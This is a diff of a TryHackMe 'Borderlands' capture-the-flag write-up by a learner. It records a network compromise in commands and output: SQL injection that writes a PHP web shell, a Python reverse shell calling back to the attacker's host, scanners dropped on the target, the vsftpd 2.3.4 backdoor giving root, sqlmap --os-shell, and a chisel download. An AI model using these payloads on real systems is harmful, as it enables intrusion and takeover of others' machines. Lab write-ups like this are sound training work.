@@ -1,13 +1,14 @@
 <p>Networking . BGP, Border Gateway Protocol . Exploitation</p>
 
 <h1 align="center">Borderlands</h1>
-<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/6aec40ad-4820-4c26-9c07-bb189b72aebb"><br>
+<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/50f2e14c-9749-43f9-83e6-cfe315476f8b"><br>
 August 31, 2025<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
 and I’m excited to join you on this adventure, part of my <code>482</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
-<em>...</em>.<br>
-Access it <a href=""</a>here.<br>
-<img width="1200px" src="https://github.com/user-attachments/assets/df979e98-b488-43fc-ac5e-8be4a7bded16"></p>
-<br>
+<em>Compromise a perimeter host and pivot through this network.</em>.<br>
+Access it <a href="https://tryhackme.com/room/borderlands"</a>here.<br>
+<img width="1200px" src="https://github.com/user-attachments/assets/8b99b5cf-a92e-4ff9-905a-bb976bf8a08b"></p>
+
+
 <br>
 
 <p align="left">Summary &nbsp;&nbsp;<br>
@@ -21,11 +22,16 @@ Access it <a href=""</a>here.<br>
 - [Transmission from server to client over UDP](#7)<br>
 - [Transmission from server to client over TCP](#8)</p>
     
-<br>
-<h2>Task 1 . Introduction</h2>
-<br>
+<h2>Task 1 . Deploy, attack and pivot through this network</h2>
+<p>This challenge was created by Context Information Security for TryHackMe HackBack2, a cy</p>
+
+<h6 align="center"><img width="500px" src="https://github.com/user-attachments/assets/72538409-4583-4c68-9732-122669fb9181"><br>Deploy the network and answer the questions below.<br>Some questions will show [X] next to them. This means the question is worth X extra points.</h6>
 
 <p><em>Answer the questions below</em></p>
+
+
+<br>
+<br>
 <br>
 <br>
 <h2 align="center">Nmap<a id='1'></a></h2>
@@ -634,6 +640,143 @@ Document ID: 1<br />Document Name: Context_Red_Teaming_Guide.pdf<br />Document L
 <img width="908" height="187" alt="image" src="https://github.com/user-attachments/assets/d50c873d-126b-4f7c-93f0-05f478c4656c" />
 
 <br>
+
+http:/xx.xxx.xx.xx/api.php?apikey=WEBLhvOJAH8d50Z4y5G5&documentid=1%20union%20all%20select%201,2,@@version into outfile ‘/var/www/html/whoami.html
+
+
+<img width="1214" height="192" alt="image" src="https://github.com/user-attachments/assets/841773fd-8ee4-4d0e-a9b9-eed8a550d52c" />
+
+
+http://10.201.65.90/api.php?apikey=WEBLhvOJAH8d50Z4y5G5&documentid=1%20union%20all%20select%201,2,%22%3C?php%20system($_GET[%27cmd%27]);%20?%3E%22%20%20into%20outfile%20%22/var/www/html/rev.php%22
+
+
+GET /api.php?apikey=WEBLhvOJAH8d50Z4y5G5&documentid=1%20union%20all%20select%201,2,%22%3C?php%20system($_GET[%27cmd%27]);%20?%3E%22%20%20into%20outfile%20%22/var/www/html/rev.php%22 HTTP/1.1
+Host: 10.201.65.90
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Cookie: PHPSESSID=jl34o4t2fk9k5lll3a7s2du158
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
+
+
+```
+
+HTTP/1.1 200 OK
+Server: nginx/1.14.0 (Ubuntu)
+Date: Tue, 09 Sep 2025 21:09:16 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: keep-alive
+Content-Length: 0
+
+
+```
+
+
+
+
+http://10.201.65.90/rev.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.201.71.77%22,9001));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
+
+
+
+:~/Borderlands# nc -nlvp 9001
+Listening on 0.0.0.0 9001
+Connection received on 10.201.65.90 40264
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+www-data@app:~/html$ ^Z
+[1]+  Stopped                 nc -nlvp 9001
+root@ip-10-201-71-77:~/Borderlands# stty raw -echo; fg
+nc -nlvp 9001
+
+www-data@app:~/html$ export TERM=xterm
+www-data@app:~/html$ 
+
+
+
+www-data@app:/home$ cd /var
+www-data@app:/var$ cd www 
+www-data@app:~$ ll
+bash: ll: command not found
+www-data@app:~$ ls
+flag.txt  html
+www-data@app:~$ cat flag.txt
+{FLAG:Webapp:48a5f4bfef44c8e9b34b926051ad35a6}
+
+
+
+
+CCv4@he2MaHbIP7mB89TNKdei0VZ0Y
+
+
+www-data@app:/$ ls -lah
+total 72K
+drwxr-xr-x   1 root root 4.0K Oct 11  2019 .
+drwxr-xr-x   1 root root 4.0K Oct 11  2019 ..
+-rwxr-xr-x   1 root root    0 Oct 11  2019 .dockerenv
+drwxr-xr-x   1 root root 4.0K Oct  8  2019 bin
+drwxr-xr-x   2 root root 4.0K Apr 24  2018 boot
+drwxr-xr-x   5 root root  340 Sep  9 20:17 dev
+drwxr-xr-x   1 root root 4.0K Oct 11  2019 etc
+drwxr-xr-x   2 root root 4.0K Apr 24  2018 home
+drwxr-xr-x   1 root root 4.0K May 23  2017 lib
+drwxr-xr-x   2 root root 4.0K Sep 12  2019 lib64
+drwxr-xr-x   2 root root 4.0K Sep 12  2019 media
+drwxr-xr-x   2 root root 4.0K Sep 12  2019 mnt
+drwxr-xr-x   2 root root 4.0K Sep 12  2019 opt
+dr-xr-xr-x 159 root root    0 Sep  9 20:17 proc
+drwx------   2 root root 4.0K Sep 12  2019 root
+drwxr-xr-x   1 root root 4.0K Oct 11  2019 run
+drwxr-xr-x   1 root root 4.0K Oct  8  2019 sbin
+drwxr-xr-x   2 root root 4.0K Sep 12  2019 srv
+dr-xr-xr-x  13 root root    0 Sep  9 20:17 sys
+drwxrwxrwt   1 root root 4.0K Sep  9 20:18 tmp
+drwxr-xr-x   1 root root 4.0K Sep 12  2019 usr
+drwxr-xr-x   1 root root 4.0K Oct  8  2019 var
+
+
+
+
+
+
+www-data@app:/$ ss
+NetidState Recv-Q Send-Q               Local Address:Port    Peer Address:Port  
+u_strESTAB 8      0         /run/php/php7.2-fpm.sock 36762              * 0     
+u_strESTAB 0      0                                * 24646              * 24647 
+u_strESTAB 0      0                                * 24742              * 24743 
+u_strESTAB 0      0                                * 24647              * 24646 
+u_strESTAB 0      0                                * 24743              * 24742 
+tcp  ESTAB 0      0                       172.18.0.2:40264   10.201.71.77:9001  
+
+
+
+
+www-data@app:/$ hostname
+app.ctx.ctf
+
+
+
+www-data@app:/$ ip route
+default via 172.18.0.1 dev eth0 
+172.16.1.0/24 dev eth1 proto kernel scope link src 172.16.1.10 
+172.18.0.0/16 dev eth0 proto kernel scope link src 172.18.0.2 
+
+
+
+
+www-data@app:/$ getent hosts
+127.0.0.1       localhost
+127.0.0.1       localhost ip6-localhost ip6-loopback
+172.18.0.2      app.ctx.ctf app
+172.16.1.10     app.ctx.ctf app
+
+
+
+
+
+
 <h3 align="center">sqlmap</h3>
 
 ```bash
@@ -856,9 +999,17 @@ os-shell>
 
 
 
+_______________________
+
 <p>Navigated to http://http://10.201.90.105/tmpudatp.php</p>
 
 <img width="1124" height="101" alt="image" src="https://github.com/user-attachments/assets/a273af44-fc86-4304-af6b-c162fe751ecc" />
+
+
+
+
+
+
 
 
 
@@ -871,7 +1022,7 @@ os-shell>
 <h2 align="center">Transmission from server to client over TCP<a id='8'></a></h2>
 <br>
 <p> 1.7. What flag is transmitted from flag_server to flag_client over TCP? {FLAG:TCP:XXX}em> Hint : use python to portscan</em><br>
-<code>{FLAG:TCP:__________________________}</code></p>
+<code>{FLAG:TCP:8fb04648d6b2bd40af6581942fcf483e}</code></p>
 <br>
 
 <img width="1129" height="140" alt="image" src="https://github.com/user-attachments/assets/e28caee7-df5a-4072-9f02-259d27a0ac47" />
@@ -955,8 +1106,8 @@ u_strESTAB      0      0                                * 24433               * 
 u_strESTAB      0      0                                * 24576               * 24575                                                                           
 u_strESTAB      0      0                                * 24575               * 24576                                                                           
 u_strESTAB      8      0         /run/php/php7.2-fpm.sock 29202               * 0                                                                               
-tcp  ESTAB      0      0                       172.18.0.2:60066   10.201.76.116:4444                                                                            
-tcp  FIN-WAIT-2 0      0                       172.18.0.2:http    10.201.76.116:41880
+tcp  ESTAB      0      0                       172.18.0.2:60066   xx.xxx.xx.xxx:4444                                                                            
+tcp  FIN-WAIT-2 0      0                       172.18.0.2:http    xx.xxx.xx.xxx:41880
 ```
 
 ```bash
@@ -974,16 +1125,20 @@ ip -s neigh
 172.18.0.1 dev eth0 lladdr 02:42:10:d2:44:9e ref 1 used 33/0/28 probes 1 REACHABLE
 ```
 
-<p align="center"><em>arp.py</em></p>
+<p align="center"><em>scan1.py</em></p>
 
 ```bash
-www-data@app:~/html$ echo 'aW1wb3J0IHNvY2tldA0KDQpmb3IgaSBpbiByYW5nZSgwLCAyNTYpOg0KICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogICAgc29jay5zZXR0aW1lb3V0KDAuNSkNCiAgICBpcCA9ICcxNzIuMTguMC57fScuZm9ybWF0KGkpDQogICAgaWYgMCA9PSBzb2NrLmNvbm5lY3RfZXgoKGlwLCAyMikpOg0KICAgICAgICBzb2NrLmNsb3NlKCkNCiAgICAgICAgcHJpbnQoaXAgKyAnICAgT04nICwgZmx1c2g9VHJ1ZSkNCiAgICBlbHNlOg0KICAgICAgICBwcmludChpcCwgIGZsdXNoPVRydWUpDQo=' | base64 -d > arp.py
-<udChpcCwgIGZsdXNoPVRydWUpDQo=' | base64 -d > arp.py
+www-data@app:~/html$ echo 'aW1wb3J0IHNvY2tldA0KDQpmb3IgaSBpbiByYW5nZSgwLCAyNTYpOg0KICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogICAgc29jay5zZXR0aW1lb3V0KDAuNSkNCiAgICBpcCA9ICcxNzIuMTguMC57fScuZm9ybWF0KGkpDQogICAgaWYgMCA9PSBzb2NrLmNvbm5lY3RfZXgoKGlwLCAyMikpOg0KICAgICAgICBzb2NrLmNsb3NlKCkNCiAgICAgICAgcHJpbnQoaXAgKyAnICAgT04nICwgZmx1c2g9VHJ1ZSkNCiAgICBlbHNlOg0KICAgICAgICBwcmludChpcCwgIGZsdXNoPVRydWUpDQo=' | base64 -d > scan1.py
+<udChpcCwgIGZsdXNoPVRydWUpDQo=' | base64 -d > scan1.py
 ```
 
+<img width="1092" height="179" alt="image" src="https://github.com/user-attachments/assets/e1db6afd-c70a-4ce0-b3f7-25c9dfa30e0d" />
 
-<img width="1255" height="784" alt="image" src="https://github.com/user-attachments/assets/d34ea431-7a2c-4ddc-8b11-acccbcd7ec6e" />
+<br>
+<br>
+<p>
 
+- 172.18.0.1</p>
 
 ```bash
 www-data@app:/tmp$
@@ -999,36 +1154,123 @@ python3 arp.py
 
 
 ```bash
-www-data@app:/tmp$ echo 'IyEvdXNyL2Jpbi9weXRob24zDQppbXBvcnQgc29ja2V0DQppbXBvcnQgc2VsZWN0DQpkZWYgc2NhbihpcCk6DQogIHByaW50KCdcbj09ICcgKyBpcCkNCiAgdHJ5Og0KICAgIGZvciBwb3J0IGluIHJhbmdlKDEsNjU1MzUpOiAgDQogICAgICBzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KICAgICAgc29jay5zZXR0aW1lb3V0KDAuMikNCiAgICAgIHJlc3VsdCA9IHNvY2suY29ubmVjdF9leCgoaXAsIHBvcnQpKQ0KICAgICAgaWYgcmVzdWx0ID09IDA6DQogICAgICAgIHNvY2suc2V0YmxvY2tpbmcoMCkNCiAgICAgICAgcmVhZHkgPSBzZWxlY3Quc2VsZWN0KFtzb2NrXSwgW10sIFtdLCAwLjUpDQogICAgICAgIGlmIHJlYWR5WzBdOg0KICAgICAgICAgIGRhdGEgPSBzb2NrLnJlY3YoNDA5NikNCiAgICAgICAgcHJpbnQoIlBvcnQge306ICAgICAgT3BlblxuICB7fSIuZm9ybWF0KHBvcnQsIGRhdGEpKQ0KICAgICAgICBzb2NrLmNsb3NlKCkNCiAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAgIHN5cy5leGl0KCkNCiAgZXhjZXB0IHNvY2tldC5nYWllcnJvcjoNCiAgICBwcmludCgnSG9zdG5hbWUgY291bGQgbm90IGJlIHJlc29sdmVkLicpDQogICAgcmV0dXJuDQogIGV4Y2VwdCBzb2NrZXQuZXJyb3I6DQogICAgcHJpbnQoIkNvdWxkbid0IGNvbm5lY3QgdG8gc2VydmVyLiIpDQogICAgcmV0dXJuDQpzY2FuKCcxNzIuMTguMC4xJyk=' | base64 -d > t.py
+www-data@app:/tmp$ echo 'IyEvdXNyL2Jpbi9weXRob24zDQppbXBvcnQgc29ja2V0DQppbXBvcnQgc2VsZWN0DQpkZWYgc2NhbihpcCk6DQogIHByaW50KCdcbj09ICcgKyBpcCkNCiAgdHJ5Og0KICAgIGZvciBwb3J0IGluIHJhbmdlKDEsNjU1MzUpOiAgDQogICAgICBzb2NrID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfU1RSRUFNKQ0KICAgICAgc29jay5zZXR0aW1lb3V0KDAuMikNCiAgICAgIHJlc3VsdCA9IHNvY2suY29ubmVjdF9leCgoaXAsIHBvcnQpKQ0KICAgICAgaWYgcmVzdWx0ID09IDA6DQogICAgICAgIHNvY2suc2V0YmxvY2tpbmcoMCkNCiAgICAgICAgcmVhZHkgPSBzZWxlY3Quc2VsZWN0KFtzb2NrXSwgW10sIFtdLCAwLjUpDQogICAgICAgIGlmIHJlYWR5WzBdOg0KICAgICAgICAgIGRhdGEgPSBzb2NrLnJlY3YoNDA5NikNCiAgICAgICAgcHJpbnQoIlBvcnQge306ICAgICAgT3BlblxuICB7fSIuZm9ybWF0KHBvcnQsIGRhdGEpKQ0KICAgICAgICBzb2NrLmNsb3NlKCkNCiAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAgIHN5cy5leGl0KCkNCiAgZXhjZXB0IHNvY2tldC5nYWllcnJvcjoNCiAgICBwcmludCgnSG9zdG5hbWUgY291bGQgbm90IGJlIHJlc29sdmVkLicpDQogICAgcmV0dXJuDQogIGV4Y2VwdCBzb2NrZXQuZXJyb3I6DQogICAgcHJpbnQoIkNvdWxkbid0IGNvbm5lY3QgdG8gc2VydmVyLiIpDQogICAgcmV0dXJuDQpzY2FuKCcxNzIuMTguMC4xJyk=' | base64 -d > ports1.py
 ```
 
 ```bash
 www-data@app:/tmp$ ls
 ls
-arp.py	ports.py
+scan1.py	ports1.py
 ```
 
+<p>
+
+- 22
+- 80</p>
+
 ```bash
-www-data@app:/tmp$ python3 ports.py
-python3 t.py
+www-data@app:/tmp$ python3 ports1.py
+python3 ports1.py
 
 == 172.18.0.1
 Port 22:      Open
   b'SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8\r\n'
 Port 80:      Open
   b'SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8\r\n'
-python3 ports.py
+python3 ports1.py
 ```
+
+
+<p>
+
+- 172.18.0.1</p>
 
 
 ```bash
-
+echo 'aW1wb3J0IHNvY2tldA0KDQpmb3IgaSBpbiByYW5nZSgwLCAyNTYpOg0KICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pDQogICAgc29jay5zZXR0aW1lb3V0KDAuNSkNCiAgICBpcCA9ICcxNzIuMTYuMS57fScuZm9ybWF0KGkpDQogICAgaWYgMCA9PSBzb2NrLmNvbm5lY3RfZXgoKGlwLCAyMikpOg0KICAgICAgICBzb2NrLmNsb3NlKCkNCiAgICAgICAgcHJpbnQoaXAgKyAnICAgT04nICwgZmx1c2g9VHJ1ZSkNCiAgICBlbHNlOg0KICAgICAgICBwcmludChpcCwgIGZsdXNoPVRydWUp' | base64 -d > scan2.py
 ```
 
 
 
 
 
+www-data@app:~/html$ chmod +x netcat 
+www-data@app:~/html$ ./netcat 172.16.1.128 21
+220 (vsFTPd 2.3.4)
+USER 123456:)
+331 Please specify the password.
+PASS 123456
+
+
+
+
+
+:~/Borderlands# stty raw -echo; fg
+nc -nlvp 4444
+
+www-data@app:~/html$ export TERM=xterm
+www-data@app:~/html$ 
+www-data@app:~/html$ pwd
+/var/www/html
+www-data@app:~/html$ ls
+CTX_WSUSpect_White_Paper.pdf
+Context_Red_Teaming_Guide.pdf
+Context_White_Paper_Pen_Test_101.pdf
+Demystifying_the_Exploit_Kit_-_Context_White_Paper.pdf
+Glibc_Adventures-The_Forgotten_Chunks.pdf
+api.php
+arp.py
+functions.php
+home.php
+index.php
+info.php
+mobile-app-prototype.apk
+netcat
+rev.php
+scan2.py
+t.py
+tmpbxmyl.php
+tmpusntl.php
+www-data@app:~/html$ ./netcat 172.16.1.128 6200
+id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+ls
+bin
+dev
+etc
+home
+lib
+media
+mnt
+opt
+proc
+root
+run
+sbin
+srv
+supervisord.log
+supervisord.pid
+sys
+tmp
+usr
+var
+cd /root
+ls
+flag.txt
+vsftpd
+cat flag.txt
+{FLAG:Router1:c877f00ce2b886446395150589166dcd}
+
+
+
+
+
+
+
+
+
+
+```bash
 www-data@app:/etc$ cat mtab
 cat mtab
 overlay / overlay rw,relatime,lowerdir=/var/lib/docker/overlay2/l/KVBCUFUX47UAB7644MIVUODG2P:/var/lib/docker/overlay2/l/DNNEDZMRFITSDUS6FGAVKZBC3C:/var/lib/docker/overlay2/l/LNYPZBCRBRYPBNFEL7WJXKSHGC:/var/lib/docker/overlay2/l/64NWWAJBZVNVDQXAC7B3QCSJIW:/var/lib/docker/overlay2/l/63GTLCTVONM6BB7C4QR2RPQN7S:/var/lib/docker/overlay2/l/XNFKVROYQCEJH2SVAOCSZPLF4R:/var/lib/docker/overlay2/l/5CN26PMZT7B5TB4MF5MRUKZ42S:/var/lib/docker/overlay2/l/HW5ANSFG3A3N7V4DFC4P6JDGWX:/var/lib/docker/overlay2/l/RX2J4X2T3G4FIUEQJ4H66MXSCG:/var/lib/docker/overlay2/l/Z4JYYRAIMVGGJIORTJNILRKRVO:/var/lib/docker/overlay2/l/L2BIMW2PVJ4TMNP4LLEAUSUCHP:/var/lib/docker/overlay2/l/TAMASXVYRB4LEVDEXVUTR7K5AA:/var/lib/docker/overlay2/l/U6CZBILSES3MSBYGFCWJU2UIII:/var/lib/docker/overlay2/l/7ICSISLE3ZKKN3SFW5FTMKDHXP:/var/lib/docker/overlay2/l/R3TPIJT7XTLI27UICJB3Q6EQIY:/var/lib/docker/overlay2/l/3X7QHVZDTEDWZ473EGB5KBR7IJ:/var/lib/docker/overlay2/l/M3RATIXHSSTEV4TKYNYYV4ML6S:/var/lib/docker/overlay2/l/L4GCHGRHD65QFB36ZAFYAQULQF:/var/lib/docker/overlay2/l/7KDP3P5IIXOXFMDSAEI3NLDTFK:/var/lib/docker/overlay2/l/SQZ5EFAFI3OSJVPRW55EPGID3H:/var/lib/docker/overlay2/l/DDKNYPHBBEFSHZCPTRX4MONWJB:/var/lib/docker/overlay2/l/VCI5PVG4DCELY5IHMAGNQVRQ2M:/var/lib/docker/overlay2/l/O7OR5RLXVSEG7J7JJKEEG6VA26,upperdir=/var/lib/docker/overlay2/99fca206e6eac126b21b6df791a6878a151f0282becd805bf9f1885ed2c2ea03/diff,workdir=/var/lib/docker/overlay2/99fca206e6eac126b21b6df791a6878a151f0282becd805bf9f1885ed2c2ea03/work 0 0
@@ -1067,11 +1309,11 @@ tmpfs /proc/timer_stats tmpfs rw,nosuid,size=65536k,mode=755 0 0
 tmpfs /proc/sched_debug tmpfs rw,nosuid,size=65536k,mode=755 0 0
 tmpfs /proc/scsi tmpfs ro,relatime 0 0
 tmpfs /sys/firmware tmpfs ro,relatime 0 0
-www-data@app:/etc$ 
+```
 
 
 
-
+```bash
 www-data@app:/$ ls -lah
 ls -lah
 total 72K
@@ -1097,8 +1339,9 @@ dr-xr-xr-x  13 root root    0 Aug 31 16:27 sys
 drwxrwxrwt   1 root root 4.0K Aug 31 19:12 tmp
 drwxr-xr-x   1 root root 4.0K Sep 12  2019 usr
 drwxr-xr-x   1 root root 4.0K Oct  8  2019 var
-www-data@app:/$ 
+```
 
+```bash
 www-data@app:/$ ps -Af
 ps -Af
 UID        PID  PPID  C STIME TTY          TIME CMD
@@ -1147,8 +1390,9 @@ www-data   732   731  0 19:18 ?        00:00:00 /bin/sh
 www-data   733   732  0 19:19 ?        00:00:00 python3 -c import pty; pty.spawn
 www-data   734   733  0 19:19 pts/7    00:00:00 /bin/bash
 www-data   756   734  0 19:29 pts/7    00:00:00 ps -Af
+```
 
-
+```bash
 ps -eo pid,cmd
   PID CMD
     1 /bin/bash /sbin/entrypoint.sh
@@ -1159,14 +1403,14 @@ ps -eo pid,cmd
   482 php-fpm: pool www
   483 nginx: master process nginx -g daemon off;
   484 nginx: worker process
+```
 
 
 
 
 
 
-
-
+```bash
 == 172.18.0.1
 Port 21:      Open
   b'220 (vsFTPd 2.3.4)\r\n'
@@ -1178,8 +1422,26 @@ Port 2605:      Open
 ...
 ```
 
+```bash
+:~/Borderlands# sqlmap -u '10.201.65.90/api.php?documentid=1&apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD' --risk 2 --level 5 --threads 10 --batch --dbs --os-shell
+```
+
+<img width="1092" height="461" alt="image" src="https://github.com/user-attachments/assets/bc97a6d8-d975-4f74-9a3d-b0223368d7bd" />
+
+<br>
+<br>
+
+<h2>tmpusntl.php>/h2>
+
+<img width="1224" height="216" alt="image" src="https://github.com/user-attachments/assets/430c48d3-b2ba-4f98-88d7-5145f6f7d62c" />
 
 
+
+
+/api.php?apikey=WEBLhvOJAH8d50Z4y5G5g4McG1GMGD
+
+
+```bash
 import urllib.request
 
 url= "http://10.201.76.116:8000/chisel"
@@ -1446,3 +1708,68 @@ meterpreter >
 
 
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<br>
+<br>
+<h2 align="center">Completed</h2>
+<p align="center"><img width="1200px" src="https://github.com/user-attachments/assets/6acf281a-d3a1-4111-ae65-748bd7c59a2c"><br>
+                  <img width="800px" src="https://github.com/user-attachments/assets/d154b510-ea6c-4958-816e-b7dbce1b6b29"></p>
+
+<h2 align="center">My TryHackMe Journey</h2>
+
+
+<div align="center"><h6>
+
+| Date              | Room                                  |Streak   |   All Time   |   All Time   |   Monthly   |   Monthly  | Points   | Rooms     | Badges    |
+|:------------------|:--------------------------------------|--------:|:-----------: | :----------: | :---------: | :--------: | :------  | :-------: | :-------: |
+|                   |                                       |         |    Global    |    Brazil    |   Global    |   Brazil   |          | Completed |           |
+| 2025, Sep 9       |Hard 🚩 - <code><strong>Borderlands</strong></code>| 491| 112ⁿᵈ | 5ᵗʰ   |    713ʳᵈ    |     10ᵗʰ    | 125,146  |  954      |    73     |
+| 2025, Sep 9       |Medium 🚩 - Forgotten Implant| 491| 112ⁿᵈ | 5ᵗʰ   |    660ᵗʰ    |     10ᵗʰ    | 125,016  |  953      |    73     |
+| 2025, Sep 8       |Easy 🔗 - Web Enumeration| 490| 112ⁿᵈ | 5ᵗʰ   |    663ʳᵈ    |     10ᵗʰ    | 124,986  |  952      |    73     |
+| 2025, Sep 8       |Easy 🔗 - iOS: Forensics| 490| 113ʳᵈ | 5ᵗʰ   |    548ᵗʰ    |     9ᵗʰ    | 124,850  |  951      |    73     |
+| 2025, Sep 7       |Medium 🚩 - VulnNet: Active| 489| 114ᵗʰ | 5ᵗʰ   |    542ⁿᵈ    |     9ᵗʰ    | 124,746  |  950      |    73     |
+| 2025, Sep 7       |Medium 🚩 - pyLon                      | 489|     114ᵗʰ |     5ᵗʰ      |    535ᵗʰ   |     9ᵗʰ    | 124,716  |  949      |    73     |
+| 2025, Sep 7       |Medium 🚩 - Pressed                    | 489     |     113ʳᵈ    |     5ᵗʰ      |    508ᵗʰ   |     9ᵗʰ    | 124,886  |  948      |    73     |
+| 2025, Sep 6       |Easy 🚩 - Classic Passwd               | 488     |     114ᵗʰ    |      5ᵗʰ     |     683ᵗʰ   |    12ⁿᵈ    | 124,476  |    947    |    73     |
+| 2025, Sep 6       |Medium 🚩 - toc2                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     695ᵗʰ   |    12ⁿᵈ    | 124,446  |    946    |    73     |
+| 2025, Sep 6       |Hard 🚩 - Extract                      | 488     |     114ᵗʰ    |      5ᵗʰ     |     716ᵗʰ   |    13ʳᵈ    | 124,386  |    945    |    73     |
+| 2025, Sep 6       |Medium 🚩 - Plotted-EMR                | 488     |     114ᵗʰ    |      5ᵗʰ     |     844ᵗʰ   |    12ⁿᵈ    | 124,326  |    944    |    73     |
+| 2025, Sep 5       |Medium 🚩 - Inferno                    | 487     |     114ᵗʰ    |      5ᵗʰ     |     758ᵗʰ   |    12ⁿᵈ    | 124,236  |    943    |    73     |
+| 2025, Sep 5       |Easy 🔗 - Psycho Break                 | 487     |     115ᵗʰ    |      5ᵗʰ     |     724ᵗʰ   |    10ᵗʰ    | 124,152  |    942    |    73     |
+| 2025, Sep 4       |Medium 🔗 - IP and Domain Threat Intel | 486     |	   113ʳᵈ   |	     5ᵗʰ   	|      579ᵗʰ   |	  10ᵗʰ    |	124,018  |	  940	   |    73     |
+| 2025, Sep 4       |Medium 🚩 - Cold VVars                 | 486     |     113ʳᵈ    |      5ᵗʰ     |     579ᵗʰ   |    10ᵗʰ    | 124,048  |    941    |    73     |
+| 2025, Sep 3       |Easy 🔗 - Malware Classification       | 485     |     112ⁿᵈ    |      5ᵗʰ     |     714ᵗʰ   |    13ʳᵈ    | 123,882  |    939    |    73     |
+| 2025, Sep 2       |Medium 🔗 - Session Forencics          | 484     |     111ˢᵗ    |      5ᵗʰ     |     706ᵗʰ   |    14ᵗʰ    | 123,786  |    938    |    73     |
+| 2025, Sep 1       |Medium 🚩 - Voyage                     | 483     |     111ˢᵗ    |      5ᵗʰ     |     849ᵗʰ   |    15ᵗʰ    | 123,636  |    937    |    73     |
+
+</h6></div><br>
+
+<br>
+
+<p align="center">Global All Time:   112ⁿᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/2b1ced37-da26-4405-aa46-8c8760d19007"><br>
+                                              <img width="1200px" src="https://github.com/user-attachments/assets/5c32e575-5fb1-4ab7-a671-fdc26f1d5bfd"><br><br>
+                  Brazil All Time:     5ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/c461eb6f-6f3d-44c1-8cd6-9ad431a3c28e"><br>
+                  Global monthly:    713ʳᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/19cd89aa-fec9-4fbd-a429-809c5b88c9fb"><br>
+                  Brazil monthly:      10ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/68f96f70-5979-44e7-aa01-79daa732c507"><br>
+
+<h2 align="center">Thanks for coming!</h2>
+<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>  
